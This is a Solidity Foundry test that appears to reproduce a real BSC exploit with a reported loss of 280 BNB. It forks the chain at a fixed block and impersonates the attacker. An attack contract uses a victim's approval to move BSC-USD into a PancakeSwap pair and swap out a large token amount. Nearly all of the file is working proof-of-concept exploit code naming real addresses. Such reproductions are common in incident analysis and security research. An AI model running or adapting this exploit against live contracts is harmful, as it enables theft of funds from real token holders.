pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 280BNB
// Attacker : https://bscscan.com/address/0x0cc28b80d21ebe7b3f3320faa059f163e98a55a2
// Attack Contract : https://bscscan.com/address/0xac4fde96cf96c5f776de7ec5528cde60f6e8dbea, https://bscscan.com/address/0xb4d13acf8c4ef796bdc761129c31bc67130301cf
// Vulnerable Contract : 
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x7b743f0fa0ffc6542bc4132405f6c986a00187b6a8b23613ab98c8bcfe9fd875

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1826101724278579639
// Twitter Guy : https://x.com/TenArmorAlert/status/1826101724278579639
// Hacking God : N/A

address constant bsc_usd = 0x55d398326f99059fF775485246999027B3197955;
address constant attacker = 0x0cc28b80D21eBe7b3f3320FAA059f163E98A55a2;
address constant addr = 0x51057dB447A6834c8FC4E9541db9c04304eF81D7;
address constant cake_lp = 0xF31cb18759FE8356348c81268b859d2a32bf2117;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 41529776);
    }
    
    function testPoC() public {
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();

        vm.startPrank(addr);
        IERC20(bsc_usd).approve(address(attC), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(attacker, attacker);
        attC.attack();
        emit log_named_decimal_uint("after attack: balance of address(attC)", IERC20(0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550).balanceOf(address(attC)), 18);
    }
}

contract AttackerC {
    fallback() external payable {}

    function attack() public {
        IERC20(bsc_usd).transferFrom(addr, cake_lp, 2212640000000000000000);
        IPancakePair(cake_lp).swap(
            0,
            3639118756532953773112984,
            address(this),
            ""
        );
    }
}